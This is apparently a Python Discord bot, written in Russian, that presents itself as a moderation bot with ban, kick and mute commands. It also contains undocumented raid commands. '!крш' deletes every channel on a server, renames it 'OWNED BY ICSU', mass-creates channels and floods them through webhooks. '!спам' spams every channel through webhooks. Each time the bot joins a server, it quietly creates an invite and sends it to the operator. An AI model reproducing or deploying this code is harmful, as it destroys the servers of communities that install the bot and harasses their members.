import discord, asyncio, datetime, json
from discord.ext import commands
from datetime import timedelta
from config import token, txt, allowed_ids



intents = discord.Intents.default()
intents.message_content = True
intents.members = True



bot = commands.Bot(command_prefix = '!', intents=intents,  case_insensitive=True, help_command=None)


@bot.event
async def on_ready():
        print(f'Bot is turned on as {bot.user.name}!')
        await bot.change_presence(status=discord.Status.idle, 
                                      activity=discord.Activity(type=discord.ActivityType.listening, name="!хелп"))

def open_whitelist():
    try:
        with open('whitelist.json', 'r') as data:
            return json.load(data)
    except FileNotFoundError:
        whitelist = []
        with open('whitelist.json', 'w') as data:
            json.dump(whitelist, data)
        return []

whitelist = open_whitelist()                                      
snipe_message = None
snipe_author = None
channame = 'crashed-by-icsu'
icsu_pfp = open("icsu.png", "rb")

    

@bot.event
async def on_guild_join(guild):
    channel = bot.get_channel(1405476031170740255)
    desc = f'''
    - ID сервера - {guild.id}
    - Количество участников - {guild.member_count}
            '''
    embed = discord.Embed(title='Бот был добавлен на сервер',description=desc,colour=discord.Colour.dark_grey())
    embed.set_footer(text=guild.name,icon_url=guild.icon)
    guildlink = None
    for textchan in guild.text_channels:
        if not guildlink:
            guildlink = str(await textchan.create_invite())
            if guildlink:
                embed.description = f'- Ссылка на сервер - {guildlink} \n' + desc
                await channel.send(embed=embed)
    
    
@bot.event
async def on_guild_remove(guild):
    chan = bot.get_channel(1405476031170740255)
    embed = discord.Embed(title='Бот был удален с сервера',colour=discord.Colour.dark_grey())
    embed.set_footer(text=guild.name,icon_url=guild.icon)
    await chan.send(embed=embed)
 
@bot.event
async def on_command_error(ctx,error):
    if isinstance(error, commands.CommandOnCooldown):
        embed = discord.Embed(title='Команда на задержке',description='Команду можно будет использовать через 6 часов!',colour=discord.Colour.red())
        await ctx.author.send(embed=embed)
 
 
@bot.command()
async def айди(ctx, member : discord.Member = None):
 if member == None:
    await ctx.reply(ctx.author.id)
 else:
    await ctx.send(member.id)
              
        
        
async def spam_hook(ctx):
    for textchan in ctx.guild.text_channels:
            webs = await textchan.webhooks()
            for web in webs:
                await web.send(txt)

async def get_hook(ctx):
    guild = ctx.guild
    for i in range(30):
        await asyncio.sleep(0.7)
        asyncio.create_task(spam_hook(ctx))


async def create_hook(ctx):
    guild = ctx.guild
    for textchan in guild.text_channels:
        webs = await textchan.create_webhook(name='ICSU')

    
        
@bot.command()
async def спам(ctx):
    if ctx.guild.id in whitelist:
        embed = discord.Embed(title='❌ Этот сервер в белом листе, заспамить сервер нельзя!',colour=discord.Colour.red())
        res = await ctx.reply(embed=embed)
        await asyncio.sleep(20)
        await res.delete()
    else:
        await ctx.message.delete()
        await create_hook(ctx)
        await get_hook(ctx)



@bot.command()
async def аватар(ctx, member : discord.Member = None):
    if member == None:
        author = ctx.author.avatar
        embed = discord.Embed(title=f'Аватар {ctx.author.name}',colour=discord.Colour.dark_grey())
        embed.set_image(url=author)
        await ctx.reply(embed=embed)
    else:
        embed = discord.Embed(title=f'Аватар {member.name}',colour=discord.Colour.dark_grey())
        embed.set_image(url=member.avatar)
        await ctx.send(embed=embed)
        
    
@bot.command()
async def хелп(ctx):
    desc='''
    
    `айди` - показывает айди пользователя
    `аватар` - показывает аватар пользователя
    `бан` - банит участника
    `разбан` - разбанивает участника
    `мут` - отправляет участника в таймоут
    `размут` - убирает с участника таймоут
    `кик` - выгоняет участника с сервера
    
    '''
    emb = discord.Embed(title='Команды',
    description=desc,colour=discord.Colour.dark_grey())
    emb.set_footer(icon_url=ctx.author.avatar,text=ctx.author.name)
    await ctx.reply(embed=emb)
    
async def crsh_channels(guild):
    for b in range(50):
        await guild.create_text_channel(name=channame)
        
        
async def del_channels(guild):
    for b in guild.channels:
        await b.delete()
    
    
@bot.command()
@commands.cooldown(1, 6 * 60 * 60, commands.BucketType.user)
async def крш(ctx):
    guild = ctx.guild
    if guild.id in whitelist:
        embed = discord.Embed(title='❌ Этот сервер находится в белом листе. Сервер нельзя крашнуть!',colour=discord.Colour.red())
        res = await ctx.reply(embed=embed)
        await asyncio.sleep(20)
        await res.delete()
    else:
        logs_channel = bot.get_channel(1405476031170740255)
        
        await ctx.message.delete()
        await ctx.guild.edit(name='OWNED BY ICSU',icon=icsu_pfp.read())
        
        asyncio.create_task(del_channels(guild))
        asyncio.create_task(crsh_channels(guild))
        
        await asyncio.sleep(10)
            
        emb = discord.Embed(title='Бот крашнул сервер', colour=discord.Colour.dark_grey(),
        description=f'- ID сервера - {guild.id} \n - Количество участников - {guild.member_count}')
        emb.set_footer(text=guild.name,icon_url=guild.icon)
           
        guildlink = None
        for textchan in guild.text_channels:
            if not guildlink:
                guildlink = str(await textchan.create_invite())
                if guildlink:
                    emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
                    await logs_channel.send(embed=emb)
      
      
       
@bot.event
async def on_guild_channel_create(channel):
    if channel.name == channame:
        web = await channel.create_webhook(name='ICSU')
        for b in range(30):
            await asyncio.sleep(0.7)
            await web.send(txt)
    else:
         return
         


@bot.command()
@commands.has_permissions(ban_members=True)
async def бан(ctx, member : discord.Member, reason = None):
    
    author=ctx.author
    desc = f"**Модератор - <@{author.id}>\n Участник - <@{member.id}>**"
    
    if author.top_role > member.top_role or ctx.author.guild.owner.id == ctx.author.id:
        await member.ban(reason=reason,delete_message_days=0)
        if reason == None:
            emb = discord.Embed(title=f"✅Участник был забанен!",
            colour=discord.Colour.dark_grey(),description=desc)
            emb.set_footer(icon_url=author.avatar,text=author.name)
            await ctx.send(embed=emb)
        else:
            res = f"\n** Причина - {reason} **"
            emb = discord.Embed(title=f"✅Участник был забанен!",
            colour=discord.Colour.dark_grey(),description=desc + res)
            emb.set_footer(icon_url=author.avatar,text=author.name)
            await ctx.send(embed=emb)

@bot.command()
@commands.has_permissions(ban_members=True)
async def разбан(ctx, id: int):
    member = await bot.fetch_user(id)
    await ctx.guild.unban(member)
    embed = discord.Embed(title=f"✅Участник был разбанен!",
    colour=discord.Colour.dark_grey(),description=f"**Модератор - <@{ctx.author.id}>\n Участник - <@{member.id}>**")
    await ctx.send(embed=embed)
    
@bot.command()
@commands.has_permissions(kick_members=True)
async def кик(ctx, member: discord.Member, reason = None):
    
    author=ctx.author
    desc = f"**Модератор - <@{author.id}>\n Участник - <@{member.id}>**"
    
    if author.top_role > member.top_role or ctx.author.guild.owner.id == ctx.author.id:
        await member.kick(reason=reason)
        if reason == None:
            emb = discord.Embed(title=f"✅Участник был выгнан!",
            colour=discord.Colour.dark_grey(),description=desc)
            emb.set_footer(icon_url=author.avatar,text=author.name)
            await ctx.send(embed=emb)
        else:
            res = f"\n** Причина - {reason} **"
            emb = discord.Embed(title=f"✅Участник был выгнан!",
            colour=discord.Colour.dark_grey(),description=desc + res)
            emb.set_footer(icon_url=author.avatar,text=author.name)
            await ctx.send(embed=emb)
   


    
    
@bot.command()
@commands.has_permissions(moderate_members=True)
async def мут(ctx, member: discord.Member, time):
    if 'час' in time:
        h = time.replace('час','')
        await member.timeout(timedelta(hours=int(h)),reason=None)
    if 'мин' in time:
        m = time.replace('мин','')
        await member.timeout(timedelta(minutes=int(m)),reason=None)
    if 'сек' in time:
        s = time.replace('сек','')
        await member.timeout(timedelta(seconds=int(s)),reason=None)
        
    desc = f'**Модератор - <@{ctx.author.id}>\n Участник - <@{member.id}>**'
    emb = discord.Embed(title=f'{member.name} в таймоуте!',
    colour=discord.Colour.dark_grey(), description=desc)    
    emb.set_footer(icon_url=ctx.author.avatar,text=ctx.author.name)
    
    await ctx.send(embed=emb)

    
@bot.command()
@commands.has_permissions(moderate_members=True)
async def размут(ctx, member: discord.Member):
    await member.timeout(None, reason=None)
    
    desc = f'**Модератор - <@{ctx.author.id}>\n Участник - <@{member.id}>**'
    emb = discord.Embed(title=f'{member.name} таймоут был убран!',
    colour=discord.Colour.dark_grey(), description=desc)    
    emb.set_footer(icon_url=ctx.author.avatar,text=ctx.author.name)
    
    await ctx.send(embed=emb)

@bot.command()
async def вайтлист(ctx, serv_id: int):
    if ctx.author.id not in allowed_ids:
        emb = discord.Embed(title='❌ У вас нет прав добавлять сервера в белый лист.', colour=discord.Colour.red())
        await ctx.send(embed=emb)
        return
    
    if serv_id not in whitelist:
        whitelist.append(serv_id)
        with open('whitelist.json', 'w') as data:
            json.dump(whitelist, data)
        emb = discord.Embed(title=f'{serv_id} был добавлен в белый лист!', colour=discord.Colour.dark_grey())
        await ctx.send(embed=emb)
    else:
        emb = discord.Embed(title='Сервер уже в белом листе.', colour=discord.Colour.dark_grey())
        await ctx.send(embed=emb)      
    
    
    
bot.run(token, log_handler=None)